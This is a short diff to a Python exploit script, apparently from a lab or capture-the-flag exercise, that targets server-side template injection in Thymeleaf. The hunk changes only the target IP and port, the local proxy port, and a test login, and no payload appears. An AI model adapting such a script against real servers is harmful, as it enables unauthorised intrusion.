@@ -6,8 +6,8 @@ This script exploits a server side template injection in Thymeleaf using 'Spring
 
 import requests
 
-target="94.237.54.201:53047" # update target ip
-proxies= {"http":"http://127.0.0.1:8080"}
+target="94.237.54.101:53047" # update target ip
+proxies= {"http":"http://127.0.0.1:8082"} # update proxy ip:port
 session= requests.Session()
 data= {"username":"test2","password":"test2"}
 
